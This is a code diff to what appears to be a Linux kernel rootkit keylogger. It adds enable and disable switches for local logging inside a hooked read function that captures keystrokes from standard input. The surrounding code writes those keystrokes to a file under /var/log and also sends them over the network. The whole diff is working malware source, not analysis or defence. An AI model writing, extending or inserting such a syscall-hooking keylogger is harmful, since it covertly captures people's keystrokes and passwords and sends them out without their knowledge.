@@ -50,6 +50,25 @@ static spinlock_t read_lock;
 static unsigned long read_lock_flags;
 
 extern int send_flag; // For network keylogging
+static int file_log = 0;
+
+/*
+ * Function used for enabling local logging
+ */
+void
+enable_filelog(void)
+{
+        file_log = 1;
+}
+
+/*
+ * Function used for disabling local logging
+ */
+void
+disable_filelog(void)
+{
+        file_log = 0;
+}
 
 /*
  * Function used for local logging inside /var/log
@@ -78,7 +97,9 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 
 	if(ret >= 1 && fd == 0) {
 		/* keylog to local file */
-		write_to_file(buf, ret);
+		if(file_log){
+			write_to_file(buf, ret);
+		}
 		
 		for(i = 0; i < ret; i++) {
 			char sendbuf[2];
